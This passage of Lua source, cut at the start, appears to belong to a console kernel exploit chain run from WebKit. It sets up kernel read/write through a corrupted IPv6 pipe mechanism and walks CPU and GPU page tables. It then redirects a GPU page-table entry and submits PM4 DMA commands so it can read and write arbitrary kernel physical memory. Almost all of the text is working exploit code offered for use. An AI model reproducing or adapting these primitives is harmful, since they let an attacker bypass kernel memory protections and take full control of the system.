    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, 0)
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10, ipv6_kernel_rw.data.pipemap_buffer)
    syscall.write(ipv6_kernel_rw.data.pipe_write_fd, uaddr, len)
end
function ipv6_kernel_rw.read_buffer(kaddr, len)
    local mem = ipv6_kernel_rw.data.read_mem
    if len > PAGE_SIZE then mem = memory.alloc(len) end
    ipv6_kernel_rw.copyout(kaddr, mem, len)
    return memory.read_buffer(mem, len)
end
function ipv6_kernel_rw.write_buffer(kaddr, buf)
    ipv6_kernel_rw.copyin(lua.resolve_value(buf), kaddr, #buf)
end

CPU_PDE_SHIFT = { PRESENT = 0, RW = 1, USER = 2, WRITE_THROUGH = 3, CACHE_DISABLE = 4, ACCESSED = 5, DIRTY = 6, PS = 7, GLOBAL = 8, XOTEXT = 58, PROTECTION_KEY = 59, EXECUTE_DISABLE = 63 }
CPU_PDE_MASKS = { PRESENT = 1, RW = 1, USER = 1, WRITE_THROUGH = 1, CACHE_DISABLE = 1, ACCESSED = 1, DIRTY = 1, PS = 1, GLOBAL = 1, XOTEXT = 1, PROTECTION_KEY = 0xf, EXECUTE_DISABLE = 1 }
CPU_PG_PHYS_FRAME = uint64("0x000ffffffffff000")
CPU_PG_PS_FRAME = uint64("0x000fffffffe00000")

function cpu_pde_field(pde, field)
    return bit64.band(bit64.rshift(pde, CPU_PDE_SHIFT[field]), CPU_PDE_MASKS[field]):tonumber()
end

function cpu_walk_pt(cr3, vaddr)
    assert(vaddr and cr3)
    local pml4e_index = bit64.band(bit64.rshift(vaddr, 39), 0x1ff)
    local pdpe_index = bit64.band(bit64.rshift(vaddr, 30), 0x1ff)
    local pde_index = bit64.band(bit64.rshift(vaddr, 21), 0x1ff)
    local pte_index = bit64.band(bit64.rshift(vaddr, 12), 0x1ff)
    local pml4e = kernel.read_qword(phys_to_dmap(cr3) + pml4e_index * 8)
    if cpu_pde_field(pml4e, "PRESENT") ~= 1 then return nil end
    local pdp_base_pa = bit64.band(pml4e, CPU_PG_PHYS_FRAME)
    local pdpe = kernel.read_qword(phys_to_dmap(pdp_base_pa) + pdpe_index * 8)
    if cpu_pde_field(pdpe, "PRESENT") ~= 1 then return nil end
    local pd_base_pa = bit64.band(pdpe, CPU_PG_PHYS_FRAME)
    local pde = kernel.read_qword(phys_to_dmap(pd_base_pa) + pde_index * 8)
    if cpu_pde_field(pde, "PRESENT") ~= 1 then return nil end
    if cpu_pde_field(pde, "PS") == 1 then
        return bit64.bor(bit64.band(pde, CPU_PG_PS_FRAME), bit64.band(vaddr, 0x1fffff))
    end
    local pt_base_pa = bit64.band(pde, CPU_PG_PHYS_FRAME)
    local pte = kernel.read_qword(phys_to_dmap(pt_base_pa) + pte_index * 8)
    if cpu_pde_field(pte, "PRESENT") ~= 1 then return nil end
    return bit64.bor(bit64.band(pte, CPU_PG_PHYS_FRAME), bit64.band(vaddr, 0x3fff))
end

function is_kernel_rw_available() return kernel.read_buffer and kernel.write_buffer end
function check_kernel_rw() if not is_kernel_rw_available() then error("kernel r/w is not available") end end
function get_proc_cr3(proc)
    check_kernel_rw()
    local vmspace = kernel.read_qword(proc + kernel_offset.PROC_VM_SPACE)
    local pmap_store = kernel.read_qword(vmspace + kernel_offset.VMSPACE_VM_PMAP)
    return kernel.read_qword(pmap_store + kernel_offset.PMAP_CR3)
end
function virt_to_phys(virt_addr, cr3)
    check_kernel_rw()
    assert(kernel.addr.dmap_base and virt_addr)
    return cpu_walk_pt(cr3 or kernel.addr.kernel_cr3, virt_addr)
end
function phys_to_dmap(phys_addr)
    assert(kernel.addr.dmap_base and phys_addr)
    return kernel.addr.dmap_base + phys_addr
end

GPU_PDE_SHIFT = { VALID = 0, IS_PTE = 54, TF = 56, BLOCK_FRAGMENT_SIZE = 59 }
GPU_PDE_MASKS = { VALID = 1, IS_PTE = 1, TF = 1, BLOCK_FRAGMENT_SIZE = 0x1f }
GPU_PDE_ADDR_MASK = uint64("0x0000ffffffffffc0")
function gpu_pde_field(pde, field)
    return bit64.band(bit64.rshift(pde, GPU_PDE_SHIFT[field]), GPU_PDE_MASKS[field]):tonumber()
end
function gpu_walk_pt(vmid, virt_addr)
    local pdb2_addr = get_pdb2_addr(vmid)
    local pml4e_index = bit64.band(bit64.rshift(virt_addr, 39), 0x1ff)
    local pdpe_index = bit64.band(bit64.rshift(virt_addr, 30), 0x1ff)
    local pde_index = bit64.band(bit64.rshift(virt_addr, 21), 0x1ff)
    local pml4e = kernel.read_qword(pdb2_addr + pml4e_index * 8)
    if gpu_pde_field(pml4e, "VALID") ~= 1 then return nil end
    local pdp_base_pa = bit64.band(pml4e, GPU_PDE_ADDR_MASK)
    local pdpe = kernel.read_qword(phys_to_dmap(pdp_base_pa) + pdpe_index * 8)
    if gpu_pde_field(pdpe, "VALID") ~= 1 then return nil end
    local pd_base_pa = bit64.band(pdpe, GPU_PDE_ADDR_MASK)
    local pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8
    local pde = kernel.read_qword(pde_va)
    if gpu_pde_field(pde, "VALID") ~= 1 then return nil end
    if gpu_pde_field(pde, "IS_PTE") == 1 then return pde_va, 0x200000 end
    local fragment_size = gpu_pde_field(pde, "BLOCK_FRAGMENT_SIZE")
    local offset = bit64.band(virt_addr, 0x1fffff)
    local pt_base_pa = bit64.band(pde, GPU_PDE_ADDR_MASK)
    local pte_index, pte, pte_va, page_size
    if fragment_size == 4 then
        pte_index = bit64.rshift(offset, 16)
        pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8
        pte = kernel.read_qword(pte_va)
        if gpu_pde_field(pte, "VALID") == 1 and gpu_pde_field(pte, "TF") == 1 then
            pte_index = bit64.rshift(bit64.band(virt_addr, 0xffff), 13)
            pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8
            page_size = 0x2000
        else
            page_size = 0x10000
        end
    elseif fragment_size == 1 then
        pte_index = bit64.rshift(offset, 13)
        pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8
        page_size = 0x2000
    end
    return pte_va, page_size
end

gpu = { dmem_size = 2 * 0x100000 }
function gpu.setup()
    check_kernel_rw()
    local libSceGnmDriver = find_mod_by_name("libSceGnmDriverForNeoMode.sprx")
    if not libSceGnmDriver then
        print("[!] libSceGnmDriverForNeoMode.sprx not loaded in WebKit; falling back to CPU kernel R/W")
        gpu.read_buffer = kernel.read_buffer
        gpu.write_buffer = kernel.write_buffer
        return
    end
    sceKernelAllocateMainDirectMemory = fcall(dlsym(LIBKERNEL_HANDLE, "sceKernelAllocateMainDirectMemory"))
    sceKernelMapDirectMemory = fcall(dlsym(LIBKERNEL_HANDLE, "sceKernelMapDirectMemory"))
    sceGnmSubmitCommandBuffers = fcall(dlsym(libSceGnmDriver.handle, "sceGnmSubmitCommandBuffers"))
    sceGnmSubmitDone = fcall(dlsym(libSceGnmDriver.handle, "sceGnmSubmitDone"))
    local prot_ro = bit32.bor(PROT_READ, PROT_WRITE, GPU_READ)
    local prot_rw = bit32.bor(prot_ro, GPU_WRITE)
    local victim_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE)
    local transfer_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE)
    local cmd_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE)
    local curproc_cr3 = get_proc_cr3(kernel.addr.curproc)
    local victim_real_pa = virt_to_phys(victim_va, curproc_cr3)
    local victim_ptbe_va, page_size = get_ptb_entry_of_relative_va(victim_va)
    if not victim_ptbe_va or page_size ~= gpu.dmem_size then
        error("failed to setup gpu primitives")
    end
    if syscall.mprotect(victim_va, gpu.dmem_size, prot_ro):tonumber() == -1 then
        error("mprotect() error: " .. get_error_string())
    end
    local initial_victim_ptbe_for_ro = kernel.read_qword(victim_ptbe_va)
    local cleared_victim_ptbe_for_ro = bit64.band(initial_victim_ptbe_for_ro, bit64.bnot(victim_real_pa))
    gpu.victim_va = victim_va
    gpu.transfer_va = transfer_va
    gpu.cmd_va = cmd_va
    gpu.victim_ptbe_va = victim_ptbe_va
    gpu.cleared_victim_ptbe_for_ro = cleared_victim_ptbe_for_ro
end
function gpu.pm4_type3_header(opcode, count)
    return bit32.bor(
        bit32.lshift(1, 1),
        bit32.lshift(bit32.band(opcode, 0xff), 8),
        bit32.lshift(bit32.band(count - 1, 0x3fff), 16),
        bit32.lshift(3, 30)
    )
end
function gpu.pm4_dma_data(dest_va, src_va, length)
    local count = 6
    local bufsize = 4 * (count + 1)
    local opcode = 0x50
    local command_len = bit32.band(length, 0x1fffff)
    local pm4 = memory.alloc(bufsize)
    local dma_data_header = bit32.bor(
        bit32.lshift(2, 13), bit32.lshift(1, 15),
        bit32.lshift(2, 25), bit32.lshift(1, 27),
        bit32.lshift(1, 31)
    )
    memory.write_dword(pm4, gpu.pm4_type3_header(opcode, count))
    memory.write_dword(pm4 + 0x4, dma_data_header)
    memory.write_dword(pm4 + 0x8, src_va.l)
    memory.write_dword(pm4 + 0xc, src_va.h)
    memory.write_dword(pm4 + 0x10, dest_va.l)
    memory.write_dword(pm4 + 0x14, dest_va.h)
    memory.write_dword(pm4 + 0x18, command_len)
    return memory.read_buffer(pm4, bufsize)
end
function gpu.submit_dma_data_command(dest_va, src_va, size)
    local dcb_count = 1
    local dcb_gpu_addr = memory.alloc(dcb_count * 0x8)
    local dcb_sizes_in_bytes = memory.alloc(dcb_count * 0x4)
    local dma_data = gpu.pm4_dma_data(dest_va, src_va, size)
    memory.write_buffer(gpu.cmd_va, dma_data)
    memory.write_qword(dcb_gpu_addr, gpu.cmd_va)
    memory.write_dword(dcb_sizes_in_bytes, #dma_data)
    local ret = sceGnmSubmitCommandBuffers(dcb_count, dcb_gpu_addr, dcb_sizes_in_bytes, 0, 0):tonumber()
    if ret ~= 0 then errorf("sceGnmSubmitCommandBuffers() error: %s", hex(ret)) end
    ret = sceGnmSubmitDone():tonumber()
    if ret ~= 0 then errorf("sceGnmSubmitDone() error: %s", hex(ret)) end
end
function gpu.transfer_physical_buffer(phys_addr, size, is_write)
    local trunc_phys_addr = bit64.band(phys_addr, bit64.bnot(gpu.dmem_size - 1))
    local offset = phys_addr - trunc_phys_addr
    if offset:tonumber() + size > gpu.dmem_size then
        error("error: trying to write more than direct memory size: " .. size)
    end
    local prot_ro = bit32.bor(PROT_READ, PROT_WRITE, GPU_READ)
    local prot_rw = bit32.bor(prot_ro, GPU_WRITE)
    if syscall.mprotect(gpu.victim_va, gpu.dmem_size, prot_ro):tonumber() == -1 then
        error("mprotect() error: " .. get_error_string())
    end
    local new_ptb = bit64.bor(gpu.cleared_victim_ptbe_for_ro, trunc_phys_addr)
    kernel.write_qword(gpu.victim_ptbe_va, new_ptb)
    if syscall.mprotect(gpu.victim_va, gpu.dmem_size, prot_rw):tonumber() == -1 then
        error("mprotect() error: " .. get_error_string())
    end
    local src = is_write and gpu.transfer_va or (gpu.victim_va + offset)
    local dst = is_write and (gpu.victim_va + offset) or gpu.transfer_va
    gpu.submit_dma_data_command(dst, src, size)
end
function gpu.read_buffer(addr, size)
    local phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3)
    if not phys_addr then errorf("failed to translate %s to physical addr", hex(addr)) end
    gpu.transfer_physical_buffer(phys_addr, size, false)
    return memory.read_buffer(gpu.transfer_va, size)
end
function gpu.write_buffer(addr, buf)
    local phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3)
    if not phys_addr then errorf("failed to translate %s to physical addr", hex(addr)) end
    memory.write_buffer(gpu.transfer_va, buf)
    gpu.transfer_physical_buffer(phys_addr, #buf, true)
end
function gpu.read_byte(kaddr) local v = gpu.read_buffer(kaddr, 1); return v and #v == 1 and uint64.unpack(v) or nil end
function gpu.read_word(kaddr) local v = gpu.read_buffer(kaddr, 2); return v and #v == 2 and uint64.unpack(v) or nil end
function gpu.read_dword(kaddr) local v = gpu.read_buffer(kaddr, 4); return v and #v == 4 and uint64.unpack(v) or nil end
function gpu.read_qword(kaddr) local v = gpu.read_buffer(kaddr, 8); return v and #v == 8 and uint64.unpack(v) or nil end
function gpu.hex_dump(kaddr, size) size = size or 0x40; return hex_dump(gpu.read_buffer(kaddr, size), kaddr) end
function gpu.write_byte(dest, value) gpu.write_buffer(dest, ub8(value):sub(1, 1)) end
function gpu.write_word(dest, value) gpu.write_buffer(dest, ub8(value):sub(1, 2)) end
function gpu.write_dword(dest, value) gpu.write_buffer(dest, ub8(value):sub(1, 4)) end
function gpu.write_qword(dest, value) gpu.write_buffer(dest, ub8(value):sub(1, 8)) end

function alloc_main_dmem(size, prot, flag)
    local out = memory.alloc(0x8)
    local ret = sceKernelAllocateMainDirectMemory(size, size, 1, out):tonumber()
    if ret ~= 0 then errorf("sceKernelAllocateMainDirectMemory() error %s", hex(ret)) end
    local phys_addr = memory.read_qword(out)
    memory.write_qword(out, 0)
    ret = sceKernelMapDirectMemory(out, size, prot, flag, phys_addr, size):tonumber()
    if ret ~= 0 then errorf("sceKernelMapDirectMemory() error %s", hex(ret)) end
    return memory.read_qword(out), phys_addr
end
function get_curproc_vmid()
    local vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE)
    return kernel.read_dword(vmspace + kernel_offset.VMSPACE_VM_VMID):tonumber()
end
function get_gvmspace(vmid)
    return kernel.addr.data_base + kernel_offset.DATA_BASE_GVMSPACE + vmid * kernel_offset.SIZEOF_GVMSPACE
end
function get_pdb2_addr(vmid)
    return kernel.read_qword(get_gvmspace(vmid) + kernel_offset.GVMSPACE_PAGE_DIR_VA)
end
function get_relative_va(vmid, va)
    local gvmspace = get_gvmspace(vmid)
    local size = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_SIZE)
    local start_addr = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_START_VA)
    if va >= start_addr and va < start_addr + size then return va - start_addr end
    return nil
end
function get_ptb_entry_of_relative_va(virt_addr)
    local vmid = get_curproc_vmid()
    local relative_va = get_relative_va(vmid, virt_addr)
    if not relative_va then errorf("invalid virtual addr %s for vmid %d", hex(virt_addr), vmid) end
    return gpu_walk_pt(vmid, relative_va)
end

bit64 = {
    band=function(a,b) return uint64(a) & uint64(b) end,
    bor=function(a,b) return uint64(a) | uint64(b) end,
    bxor=function(a,b) return uint64(a) ~ uint64(b) end,
    bnot=function(a) return uint64(a) ~ uint64("0xffffffffffffffff") end,
    lshift=function(a,n) return uint64(a) << n end,
    rshift=function(a,n) return uint64(a) >> n end,
}
local function fold(operation, identity, ...)
    local result = uint64(identity)
    for i=1,select("#",...) do result = operation(result,uint64(select(i,...))) end
    return result
end
bit64.band=function(...) return fold(function(a,b) return a & b end,"0xffffffffffffffff",...) end
bit64.bor=function(...) return fold(function(a,b) return a | b end,0,...) end
bit64.bxor=function(...) return fold(function(a,b) return a ~ b end,0,...) end
bit32 = {}
local mask32 = uint64("0xffffffff")
for _,name in ipairs({"band","bor","bxor","bnot"}) do
    bit32[name] = function(...) return (bit64[name](...) & mask32):tonumber() end
end
function bit32.lshift(a,n)
    if n >= 32 or n <= -32 then return 0 end
    return (((uint64(a) & mask32) << n) & mask32):tonumber()
end
function bit32.rshift(a,n) return bit32.lshift(a,-n) end
